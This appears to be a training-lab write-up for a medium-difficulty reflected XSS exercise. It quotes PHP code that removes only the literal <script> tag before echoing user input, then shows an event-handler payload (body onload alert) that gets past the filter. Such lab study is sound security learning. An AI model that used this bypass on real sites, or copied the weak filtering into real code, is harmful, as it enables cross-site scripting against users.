@@ -1,0 +1,34 @@
+xss reflected level medium : - 
+
+<?php
+
+header ("X-XSS-Protection: 0");
+
+// Is there any input?
+if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
+    // Get input
+    $name = str_replace( '<script>', '', $_GET[ 'name' ] );
+
+    // Feedback for end user
+    echo "<pre>Hello ${name}</pre>";
+}
+
+?> 
+
+
+At this level there is validation to remove the tag <script> on the input. if we use the
+previous payload, the result will be as follows: 
+
+<script>alert('Hacked')</script>
+
+now you will see the result is here view page source :
+<pre>Hello alert('Hacked')</script></pre>
+
+to solve this we have to find a way to run javascript on the web without using the <script>
+
+perform attack:
+<body onload="alert('Hacked')">
+
+now you will see the view page source : 
+<pre>Hello <body onload="alert('Hacked')"></pre>
+
